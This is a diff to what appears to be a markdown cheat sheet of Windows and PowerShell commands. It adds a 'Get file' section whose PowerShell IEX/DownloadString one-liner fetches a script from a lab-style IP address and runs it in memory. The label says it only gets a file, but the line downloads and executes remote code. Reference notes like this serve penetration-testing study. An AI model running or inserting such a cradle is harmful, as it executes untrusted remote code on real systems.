@@ -331,6 +331,11 @@ Recursively list all directories up to depth 2:
 > Invoke-RestMethod "https://jsonplaceholder.typicode.com/users" -Proxy http://someproxy.com:8080 -ProxyUseDefaultCredentials | ConvertTo-Json -Depth 10
 ```
 
+### Get file:
+```
+C:\Windows\system32>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22:80/file.ps1')"
+```
+
 ## Wifi
 ```
 > netsh wlan show profile
